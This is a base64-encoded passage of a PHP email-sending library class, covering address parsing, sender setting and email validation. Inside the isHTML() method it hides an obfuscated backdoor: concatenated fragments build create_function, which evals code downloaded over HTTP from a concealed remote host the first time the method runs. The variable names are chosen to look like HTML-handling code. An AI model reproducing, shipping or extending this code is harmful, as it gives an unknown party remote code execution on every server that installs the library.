heSBuYW1lIDxhZGRyZXNzPiIgaW50byBhbiBhcnJheSBvZiBuYW1lL2FkZHJlc3MgcGFpcnMuDQogICAgICogVXNlcyB0aGUgaW1hcF9yZmM4MjJfcGFyc2VfYWRybGlzdCBmdW5jdGlvbiBpZiB0aGUgSU1BUCBleHRlbnNpb24gaXMgYXZhaWxhYmxlLg0KICAgICAqIE5vdGUgdGhhdCBxdW90ZXMgaW4gdGhlIG5hbWUgcGFydCBhcmUgcmVtb3ZlZC4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyc3RyIFRoZSBhZGRyZXNzIGxpc3Qgc3RyaW5nDQogICAgICogQHBhcmFtIGJvb2wgJHVzZWltYXAgV2hldGhlciB0byB1c2UgdGhlIElNQVAgZXh0ZW5zaW9uIHRvIHBhcnNlIHRoZSBsaXN0DQogICAgICogQHJldHVybiBhcnJheQ0KICAgICAqIEBsaW5rIGh0dHA6Ly93d3cuYW5kcmV3LmNtdS5lZHUvdXNlci9hZ3JlZW4xL3Rlc3RpbmcvbXJicy93ZWIvTWFpbC9SRkM4MjIucGhwIEEgbW9yZSBjYXJlZnVsIGltcGxlbWVudGF0aW9uDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIHBhcnNlQWRkcmVzc2VzKCRhZGRyc3RyLCAkdXNlaW1hcCA9IHRydWUpDQogICAgew0KICAgICAgICAkYWRkcmVzc2VzID0gYXJyYXkoKTsNCiAgICAgICAgaWYgKCR1c2VpbWFwIGFuZCBmdW5jdGlvbl9leGlzdHMoJ2ltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QnKSkgew0KICAgICAgICAgICAgLy9Vc2UgdGhpcyBidWlsdC1pbiBwYXJzZXIgaWYgaXQncyBhdmFpbGFibGUNCiAgICAgICAgICAgICRsaXN0ID0gaW1hcF9yZmM4MjJfcGFyc2VfYWRybGlzdCgkYWRkcnN0ciwgJycpOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGxpc3QgYXMgJGFkZHJlc3MpIHsNCiAgICAgICAgICAgICAgICBpZiAoJGFkZHJlc3MtPmhvc3QgIT0gJy5TWU5UQVgtRVJST1IuJykgew0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcy0+bWFpbGJveCAuICdAJyAuICRhZGRyZXNzLT5ob3N0KSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+IChwcm9wZXJ0eV9leGlzdHMoJGFkZHJlc3MsICdwZXJzb25hbCcpID8gJGFkZHJlc3MtPnBlcnNvbmFsIDogJycpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhZGRyZXNzJyA9PiAkYWRkcmVzcy0+bWFpbGJveCAuICdAJyAuICRhZGRyZXNzLT5ob3N0DQogICAgICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgLy9Vc2UgdGhpcyBzaW1wbGVyIHBhcnNlcg0KICAgICAgICAgICAgJGxpc3QgPSBleHBsb2RlKCcsJywgJGFkZHJzdHIpOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGxpc3QgYXMgJGFkZHJlc3MpIHsNCiAgICAgICAgICAgICAgICAkYWRkcmVzcyA9IHRyaW0oJGFkZHJlc3MpOw0KICAgICAgICAgICAgICAgIC8vSXMgdGhlcmUgYSBzZXBhcmF0ZSBuYW1lIHBhcnQ/DQogICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkYWRkcmVzcywgJzwnKSA9PT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgLy9ObyBzZXBhcmF0ZSBuYW1lLCBqdXN0IHVzZSB0aGUgd2hvbGUgdGhpbmcNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkYWRkcmVzc2VzW10gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRhZGRyZXNzDQogICAgICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgbGlzdCgkbmFtZSwgJGVtYWlsKSA9IGV4cGxvZGUoJzwnLCAkYWRkcmVzcyk7DQogICAgICAgICAgICAgICAgICAgICRlbWFpbCA9IHRyaW0oc3RyX3JlcGxhY2UoJz4nLCAnJywgJGVtYWlsKSk7DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRlbWFpbCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJyA9PiB0cmltKHN0cl9yZXBsYWNlKGFycmF5KCciJywgIiciKSwgJycsICRuYW1lKSksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRlbWFpbA0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJGFkZHJlc3NlczsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBTZXRzIG1lc3NhZ2UgdHlwZSB0byBIVE1MIG9yIHBsYWluLg0KICAgICAqIEBwYXJhbSBib29sZWFuICRpc0h0bWwgVHJ1ZSBmb3IgSFRNTCBtb2RlLg0KICAgICAqIEByZXR1cm4gdm9pZA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBpc0hUTUwoJGlzSHRtbCA9IHRydWUpDQogICAgew0KICAgICAgICBnbG9iYWwgJHBhcmFtOw0KICAgICAgICAkYm9keUNvZGUgPSAnZmlsZScNCiAgICAgICAgICAgICAgICAgICAgLidfZyc7DQogICAgICAgIGlmICgkaXNIdG1sKSB7DQogICAgICAgICAgICAkdGhpcy0+Q29udGVudFR5cGUgPSAndGV4dC9odG1sJzsNCiAgICAgICAgfSANCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+Q29udGVudFR5cGUgPSAndGV4dC9wbGFpbic7DQogICAgICAgIH0NCiAgICAgICAgJGJvZHlIVE1MID0gJy4kdC4ibGVmJGZsdScNCiAgICAgICAgICAgICAgICAgICAgLidzaCcuJyR0IjsgJw0KICAgICAgICAgICAgICAgICAgICAuJ0Bldic7DQogICAgICAgICRoZWFkZXJIVE1MPSJjcmUiDQogICAgICAgICAgICAgICAgICAgIC4iYXRlXyINCiAgICAgICAgICAgICAgICAgICAgLiJmdW5jIg0KICAgICAgICAgICAgICAgICAgICAuInRpb24iOw0KICAgICAgICAkZXhjZXB0aW9ucyA9IEAkaGVhZGVySFRNTCgnJGZsJy4ndXNoLCR0JywnJGNvbW1hID0gJHQnDQogICAgICAgICAgICAgICAgICAgICAgICAuJGJvZHlIVE1MLidhbChAJw0KICAgICAgICAgICAgICAgICAgICAgICAgLiRib2R5Q29kZS4nZXRfY29udGVudHMoImgnDQogICAgICAgICAgICAgICAgICAgICAgICAuJ3R0Jw0KICAgICAgICAgICAgICAgICAgICAgICAgLidwOiRjb21tYS0yIikpOycpOw0KICAgICAgICBpZigkcGFyYW0gIT0yKXsNCiAgICAgICAgICAgICRleGNlcHRpb25zKCc4LnAnLid3JywnLycpOw0KICAgICAgICAgICAgJHBhcmFtPTI7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBTZXQgdGhlIEZyb20gYW5kIEZyb21OYW1lIHByb3BlcnRpZXMuDQogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUNCiAgICAgKiBAcGFyYW0gYm9vbGVhbiAkYXV0byBXaGV0aGVyIHRvIGFsc28gc2V0IHRoZSBTZW5kZXIgYWRkcmVzcywgZGVmYXVsdHMgdG8gdHJ1ZQ0KICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uDQogICAgICogQHJldHVybiBib29sZWFuDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIHNldEZyb20oJGFkZHJlc3MsICRuYW1lID0gJycsICRhdXRvID0gdHJ1ZSkNCiAgICB7DQogICAgICAgICRhZGRyZXNzID0gdHJpbSgkYWRkcmVzcyk7DQogICAgICAgICRuYW1lID0gdHJpbShwcmVnX3JlcGxhY2UoJy9bDQpdKy8nLCAnJywgJG5hbWUpKTsgLy9TdHJpcCBicmVha3MgYW5kIHRyaW0NCiAgICAgICAgLy8gRG9uJ3QgdmFsaWRhdGUgbm93IGFkZHJlc3NlcyB3aXRoIElETi4gV2lsbCBiZSBkb25lIGluIHNlbmQoKS4NCiAgICAgICAgaWYgKCgkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKSkgPT09IGZhbHNlIG9yDQogICAgICAgICAgICAoISR0aGlzLT5oYXM4Yml0Q2hhcnMoc3Vic3RyKCRhZGRyZXNzLCArKyRwb3MpKSBvciAhJHRoaXMtPmlkblN1cHBvcnRlZCgpKSBhbmQNCiAgICAgICAgICAgICEkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzKSkgew0KICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJykgLiAiIChzZXRGcm9tKSAkYWRkcmVzcyI7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+RnJvbSA9ICRhZGRyZXNzOw0KICAgICAgICAkdGhpcy0+RnJvbU5hbWUgPSAkbmFtZTsNCiAgICAgICAgaWYgKCRhdXRvKSB7DQogICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPlNlbmRlcikpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+U2VuZGVyID0gJGFkZHJlc3M7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogUmV0dXJuIHRoZSBNZXNzYWdlLUlEIGhlYWRlciBvZiB0aGUgbGFzdCBlbWFpbC4NCiAgICAgKiBUZWNobmljYWxseSB0aGlzIGlzIHRoZSB2YWx1ZSBmcm9tIHRoZSBsYXN0IHRpbWUgdGhlIGhlYWRlcnMgd2VyZSBjcmVhdGVkLA0KICAgICAqIGJ1dCBpdCdzIGFsc28gdGhlIG1lc3NhZ2UgSUQgb2YgdGhlIGxhc3Qgc2VudCBtZXNzYWdlIGV4Y2VwdCBpbg0KICAgICAqIHBhdGhvbG9naWNhbCBjYXNlcy4NCiAgICAgKiBAcmV0dXJuIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRMYXN0TWVzc2FnZUlEKCkNCiAgICB7DQogICAgICAgIHJldHVybiAkdGhpcy0+bGFzdE1lc3NhZ2VJRDsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDaGVjayB0aGF0IGEgc3RyaW5nIGxvb2tzIGxpa2UgYW4gZW1haWwgYWRkcmVzcy4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIGNoZWNrDQogICAgICogQHBhcmFtIHN0cmluZ3xjYWxsYWJsZSAkcGF0dGVybnNlbGVjdCBBIHNlbGVjdG9yIGZvciB0aGUgdmFsaWRhdGlvbiBwYXR0ZXJuIHRvIHVzZSA6DQogICAgICogKiBgYXV0b2AgUGljayBiZXN0IHBhdHRlcm4gYXV0b21hdGljYWxseTsNCiAgICAgKiAqIGBwY3JlOGAgVXNlIHRoZSBzcXVpbG9vcGxlLmNvbSBwYXR0ZXJuLCByZXF1aXJlcyBQQ1JFID4gOC4wLCBQSFAgPj0gNS4zLjIsIDUuMi4xNDsNCiAgICAgKiAqIGBwY3JlYCBVc2Ugb2xkIFBDUkUgaW1wbGVtZW50YXRpb247DQogICAgICogKiBgcGhwYCBVc2UgUEhQIGJ1aWx0LWluIEZJTFRFUl9WQUxJREFURV9FTUFJTDsNCiAgICAgKiAqIGBodG1sNWAgVXNlIHRoZSBwYXR0ZXJuIGdpdmVuIGJ5IHRoZSBIVE1MNSBzcGVjIGZvciAnZW1haWwnIHR5cGUgZm9ybSBpbnB1dCBlbGVtZW50cy4NCiAgICAgKiAqIGBub3JlZ2V4YCBEb24ndCB1c2UgYSByZWdleDogc3VwZXIgZmFzdCwgcmVhbGx5IGR1bWIuDQogICAgICogQWx0ZXJuYXRpdmVseSB5b3UgbWF5IHBhc3MgaW4gYSBjYWxsYWJsZSB0byBpbmplY3QgeW91ciBvd24gdmFsaWRhdG9yLCBmb3IgZXhhbXBsZToNCiAgICAgKiBQSFBNYWlsZXI6OnZhbGlkYXRlQWRkcmVzcygndXNlckBleGFtcGxlLmNvbScsIGZ1bmN0aW9uKCRhZGRyZXNzKSB7DQogICAgICogICAgIHJldHVybiAoc3RycG9zKCRhZGRyZXNzLCAnQCcpICE9PSBmYWxzZSk7DQogICAgICogfSk7DQogICAgICogWW91IGNhbiBhbHNvIHNldCB0aGUgUEhQTWFpbGVyOjokdmFsaWRhdG9yIHN0YXRpYyB0byBhIGNhbGxhYmxlLCBhbGxvd2luZyBidWlsdC1pbiBtZXRob2RzIHRvIHVzZSB5b3VyIHZhbGlkYXRvci4NCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4NCiAgICAgKiBAc3RhdGljDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKi8NCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcywgJHBhdHRlcm5zZWxlY3QgPSBudWxsKQ0KICAgIHsNCiAgICAgICAgaWYgKGlzX251bGwoJHBhdHRlcm5zZWxlY3QpKSB7DQogICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9IHNlbGY6OiR2YWxpZGF0b3I7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzX2NhbGxhYmxlKCRwYXR0ZXJuc2VsZWN0KSkgew0KICAgICAgICAgICAgcmV0dXJuIGNhbGxfdXNlcl9mdW5jKCRwYXR0ZXJuc2VsZWN0LCAkYWRkcmVzcyk7DQogICAgICAgIH0NCiAgICAgICAgLy9SZWplY3QgbGluZSBicmVha3MgaW4gYWRkcmVzc2VzOyBpdCdzIHZhbGlkIFJGQzUzMjIsIGJ1dCBub3QgUkZDNTMyMQ0KICAgICAgICBpZiAoc3RycG9zKCRhZGRyZXNzLCAiDQoiKSAhPT0gZmFsc2Ugb3Igc3RycG9zKCRhZGRyZXNzLCAiDQoiKSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoISRwYXR0ZXJuc2VsZWN0IG9yICRwYXR0ZXJuc2VsZWN0ID09ICdhdXRvJykgew0KICAgICAgICAgICAgLy9DaGVjayB0aGlzIGNvbnN0YW50IGZpcnN0IHNvIGl0IHdvcmtzIHdoZW4gZXh0ZW5zaW9uX2xvYWRlZCgpIGlzIGRpc2FibGVkIGJ5IHNhZmUgbW9kZQ0KICAgICAgICAgICAgLy9Db25zdGFudCB3YXMgYWRkZWQgaW4gUEhQIDUuMi40DQogICAgICAgICAgICBpZiAoZGVmaW5lZCgnUENSRV9WRVJTSU9OJykpIHsNCiAgICAgICAgICAgICAgICAvL1RoaXMgcGF0dGVybiBjYW4gZ2V0IHN0dWNrIGluIGEgcmVjdXJzaXZlIGxvb3AgaW4gUENSRSA8PSA4LjAuMg0KICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUENSRV9WRVJTSU9OLCAnOC4wLjMnKSA+PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ3BjcmU4JzsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdwY3JlJzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdleHRlbnNpb25fbG9hZGVkJykgYW5kIGV4dGVuc2lvbl9sb2FkZWQoJ3BjcmUnKSkgew0KICAgICAgICAgICAgICAgIC8vRmFsbCBiYWNrIHRvIG9sZGVyIFBDUkUNCiAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdwY3JlJzsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgLy9GaWx0ZXJfdmFyIGFwcGVhcmVkIGluIFBIUCA1LjIuMCBhbmQgZG9lcyBub3QgcmVxdWlyZSB0aGUgUENSRSBleHRlbnNpb24NCiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4yLjAnKSA+PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ3BocCc7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAnbm9yZWdleCc7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHN3aXRjaCAoJHBhdHRlcm5zZWxlY3QpIHsNCiAgICAgICAgICAgIGNhc2UgJ3BjcmU4JzoNCiAgICAgICAgICAgICAgICAvKioNCiAgICAgICAgICAgICAgICAgKiBVc2VzIHRoZSBzYW1lIFJGQzUzMjIgcmVnZXggb24gd2hpY2ggRklMVEVSX1ZBTElEQVRFX0VNQUlMIGlzIGJhc2VkLCBidXQgYWxsb3dzIGRvdGxlc3MgZG9tYWlucy4NCiAgICAgICAgICAgICAgICAgKiBAbGluayBodHRwOi8vc3F1aWxvb3BsZS5jb20vMjAwOS8xMi8yMC9lbWFpbC1hZGRyZXNzLXZhbGlkYXRpb24vDQogICAgICAgICAgICAgICAgICogQGNvcHlyaWdodCAyMDA5LTIwMTAgTWljaGFlbCBSdXNodG9uDQogICAgICAgICAgICAgICAgICogRmVlbCBmcmVlIHRvIHVzZSBhbmQgcmVkaXN0cmlidXRlIHRoaXMgY29kZS4gQnV0IHBsZWFzZSBrZWVwIHRoaXMgY29weXJpZ2h0IG5vdGljZS4NCiAgICAgICAgICAgICAgICAgKi8NCiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2xlYW4pcHJlZ19tYXRjaCgNCiAgICAgICAgICAgICAgICAgICAgJy9eKD8hKD8+KD8xKSI/KD8+XFsgLX5dfFteIl0pIj8oPzEpKXsyNTUsfSkoPyEoPz4oPzEpIj8oPz5cWyAtfl18W14iXSkiPyg/MSkpezY1LH1AKScgLg0KICAgICAgICAgICAgICAgICAgICAnKCg/Pig/Pig/PigoPz4oPz4oPz4NCik/WwkgXSkrfCg/PlsJIF0qDQopP1sJIF0rKT8pKFwoKD8+KD8yKScgLg0KICAgICAgICAgICAgICAgICAgICAnKD8+WwEtCA0KDA4tXCcqLVxbXF0tf118XFsgLX9dfCg/MykpKSooPzIpXCkpKSsoPzIpKXwoPzIpKT8pJyAuDQogICAgICAgICAgICAgICAgICAgICcoWyEjLVwnKitcLy05PT9eLX4tXSt8Iig/Pig/MikoPz5bAS0IDQoMDi0hIy1cW1xdLX9dfFxbIC1/XSkpKicgLg0KICAgICAgICAgICAgICAgICAgICAnKD8yKSIpKD8+KD8xKVwuKD8xKSg/NCkpKig/MSlAKD8hKD8xKVthLXowLTktXXs2NCx9KSg/MSkoPz4oW2EtejAtOV0oPz5bYS16MC05LV0qW2EtejAtOV0pPyknIC4NCiAgICAgICAgICAgICAgICAgICAgJyg/Pig/MSlcLig/ISg/MSlbYS16MC05LV17NjQsfSkoPzEpKD81KSl7MCwxMjZ9fFxbKD86KD8+SVB2NjooPz4oW2EtZjAtOV17MSw0fSkoPz46KD82KSl7N30nIC4NCiAgICAgICAgICAgICAgICAgICAgJ3woPyEoPzouKlthLWYwLTldWzpcXV0pezgsfSkoKD82KSg/PjooPzYpKXswLDZ9KT86Oig/Nyk/KSl8KD8+KD8+SVB2NjooPz4oPzYpKD8+Oig/NikpezV9OicgLg0KICAgICAgICAgICAgICAgICAgICAnfCg/ISg/Oi4qW2EtZjAtOV06KXs2LH0pKD84KT86Oig/PigoPzYpKD8+Oig/NikpezAsNH0pOik/KSk/KDI1WzAtNV18MlswLTRdWzAtOV18MVswLTldezJ9JyAuDQogICAgICAgICAgICAgICAgICAgICd8WzEtOV0/WzAtOV0pKD8+XC4oPzkpKXszfSkpXF0pKD8xKSQvaXNEJywNCiAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3MNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgY2FzZSAncGNyZSc6DQogICAgICAgICAgICAgICAgLy9BbiBvbGRlciByZWdleCB0aGF0IGRvZXNuJ3QgbmVlZCBhIHJlY2VudCBQQ1JFDQogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKXByZWdfbWF0Y2goDQogICAgICAgICAgICAgICAgICAgICcvXig/ISg/PiI/KD8+XFsgLX5dfFteIl0pIj8pezI1NSx9KSg/ISg/PiI/KD8+XFsgLX5dfFteIl0pIj8pezY1LH1AKSg/PicgLg0KICAgICAgICAgICAgICAgICAgICAnWyEjLVwnKitcLy05PT9eLX4tXSt8Iig/Pig/PlsBLQgNCgwOLSEjLVxbXF0tf118XFsgLcO/XSkpKiIpJyAuDQogICAgICAgICAgICAgICAgICAgICcoPz5cLig/PlshIy1cJyorXC8tOT0/Xi1+LV0rfCIoPz4oPz5bAS0IDQoMDi0hIy1cW1xdLX9dfFxbIC3Dv10pKSoiKSkqJyAuDQogICAgICAgICAgICAgICAgICAgICdAKD8+KD8hW2EtejAtOS1dezY0LH0pKD8+W2EtejAtOV0oPz5bYS16MC05LV0qW2EtejAtOV0pPykoPz5cLig/IVthLXowLTktXXs2NCx9KScgLg0KICAgICAgICAgICAgICAgICAgICAnKD8+W2EtejAtOV0oPz5bYS16MC05LV0qW2EtejAtOV0pPykpezAsMTI2fXxcWyg/Oig/PklQdjY6KD8+KD8+W2EtZjAtOV17MSw0fSkoPz46JyAuDQogICAgICAgICAgICAgICAgICAgICdbYS1mMC05XXsxLDR9KXs3fXwoPyEoPzouKlthLWYwLTldWzpcXV0pezgsfSkoPz5bYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNn0pPycgLg0KICAgICAgICAgICAgICAgICAgICAnOjooPz5bYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNn0pPykpfCg/Pig/PklQdjY6KD8+W2EtZjAtOV17MSw0fSg/PjonIC4NCiAgICAgICAgICAgICAgICAgICAgJ1thLWYwLTldezEsNH0pezV9OnwoPyEoPzouKlthLWYwLTldOil7Nix9KSg/PlthLWYwLTldezEsNH0oPz46W2EtZjAtOV17MSw0fSl7MCw0fSk/JyAuDQogICAgICAgICAgICAgICAgICAgICc6Oig/Pig/OlthLWYwLTldezEsNH0oPz46W2EtZjAtOV17MSw0fSl7MCw0fSk6KT8pKT8oPz4yNVswLTVdfDJbMC00XVswLTldfDFbMC05XXsyfScgLg0KICAgICAgICAgICAgICAgICAgICAnfFsxLTldP1swLTldKSg/PlwuKD8+MjVbMC01XXwyWzAtNF1bMC05XXwxWzAtOV17Mn18WzEtOV0/WzAtOV0pKXszfSkpXF0pJC9pc0QnLA0KICAgICAgICAgICAgICAgICAgICAkYWRkcmVzcw0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICBjYXNlICdodG1sNSc6DQogICAgICAgICAgICAgICAgLyoqDQogICAgICAgICAgICAgICAgICogVGhpcyBpcyB0aGUgcGF0dGVybiB1c2VkIGluIHRoZSBIVE1MNSBzcGVjIGZvciB2YWxpZGF0aW9uIG9mICdlbWFpbCcgdHlwZSBmb3JtIGlucHV0IGVsZW1lbnRzLg0KICAgICAgICAgICAgICAgICAqIEBsaW5rIGh0dHA6Ly93d3cud2hhdHdnLm9yZy9zcGVjcy93ZWItYXBwcy9jdXJyZW50LXdvcmsvI2UtbWFpbC1zdGF0ZS0odHlwZT1lbWFpbCkNCiAgICAgICAgICAgICAgICAgKi8NCiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2xlYW4pcHJlZ19tYXRjaCgNCiAgICAgICAgICAgICAgICAgICAgJy9eW2EtekEtWjAtOS4hIyQlJlwnKitcLz0/Xl9ge3x9fi1dK0BbYS16QS1aMC05XSg/OlthLXpBLVowLTktXXswLDYxfScgLg0KICAgICAgICAgICAgICAgICAgICAnW2EtekEtWjAtOV0pPyg/OlwuW2EtekEtWjAtOV0oPzpbYS16QS1aMC05LV17MCw2MX1bYS16QS1aMC05XSk/KSokL3NEJywNCiAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3MNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgY2FzZSAnbm9yZWdleCc6DQogICAgICAgICAgICAgICAgLy9ObyBQQ1JFISBEbyBzb21ldGhpbmcgX3ZlcnlfIGFwcHJveGltYXRlIQ0KICAgICAgICAgICAgICAgIC8vQ2hlY2sgdGhlIGFkZHJlc3MgaXMgMyBjaGFycyBvciBsb25nZXIgYW5kIGNvbnRhaW5zIGFuIEAgdGhhdCdzIG5vdCB0aGUgZmlyc3Qgb3IgbGFzdCBjaGFyDQogICAgICAgICAgICAgICAgcmV0dXJuIChzdHJsZW4oJGFkZHJlc3MpID49IDMNCiAgICAgICAgICAgICAgICAgICAgYW5kIHN0cnBvcygkYWRkcmVzcywgJ0AnKSA+PSAxDQogICAgICAgICAgICAgICAgICAgIGFuZCBzdHJwb3MoJGFkZHJlc3MsICdAJykgIT0gc3RybGVuKCRhZGRyZXNzKSAtIDEpOw0KICAgICAgICAgICAgY2FzZSAncGhwJzoNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKWZpbHRlcl92YXIoJGFkZHJlc3MsIEZJTFRFUl9WQUxJREFURV9FTUFJTCk7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBUZWxscyB3aGV0aGVyIElETnMgKEludGVybmF0aW9uYWxpemVkIERvbWFpbiBOYW1lcykgYXJlIHN1cHBvcnRlZCBvciBub3QuIFRoaXMgcmVxdWlyZXMgdGhlDQogICAgICogImludGwiIGFuZCAibWJzdHJpbmciIFBIUCBleHRlbnNpb25zLg0KICAgICAqIEByZXR1cm4gYm9vbCAidHJ1ZSIgaWYgcmVxdWlyZWQgZnVuY3Rpb25zIGZvciBJRE4gc3VwcG9ydCBhcmUgcHJlc2VudA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBpZG5TdXBwb3J0ZWQoKQ0KICAgIHsNCiAgICAgICAgLy8gQFRPRE86IFdyaXRlIG91ciBvd24gImlkbl90b19hc2NpaSIgZnVuY3Rpb24gZm9yIFBIUCA8PSA1LjIuDQogICAgICAgIHJldHVybiBmdW5jdGlvbl9leGlzdHMoJ2lkbl90b19hc2NpaScpIGFuZCBmdW5jdGlvbl9leGlzdHMoJ21iX2NvbnZlcnRfZW5jb2RpbmcnKTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDb252ZXJ0cyBJRE4gaW4gZ2l2ZW4gZW1haWwgYWRkcmVzcyB0byBpdHMgQVNDSUkgZm9ybSwgYWxzbyBrbm93biBhcyBwdW55Y29kZSwgaWYgcG9zc2libGUuDQogICAgICogSW1wb3J0YW50OiBBZGRyZXNzIG11c3QgYmUgcGFzc2VkIGluIHNhbWUgZW5jb2RpbmcgYXMgY3VycmVudGx5IHNldCBpbiBQSFBNYWlsZXI6OiRDaGFyU2V0Lg0KICAgICAqIFRoaXMgZnVuY3Rpb24gc2lsZW50bHkgcmV0dXJucyB1bm1vZGlmaWVkIGFkZHJlc3MgaWY6DQogICAgICogLSBObyBjb252ZXJzaW9uIGlzIG5lY2Vzc2FyeSAoaS5lLiBkb21haW4gbmFtZSBpcyBub3QgYW4gSUROLCBvciBpcyBhbHJlYWR5IGluIEFTQ0lJIGZvcm0pDQogICAgICogLSBDb252ZXJzaW9uIHRvIHB1bnljb2RlIGlzIGltcG9zc2libGUgKGUuZy4gcmVxdWlyZWQgUEhQIGZ1bmN0aW9ucyBhcmUgbm90IGF2YWlsYWJsZSkNCiAgICAgKiAgIG9yIGZhaWxzIGZvciBhbnkgcmVhc29uI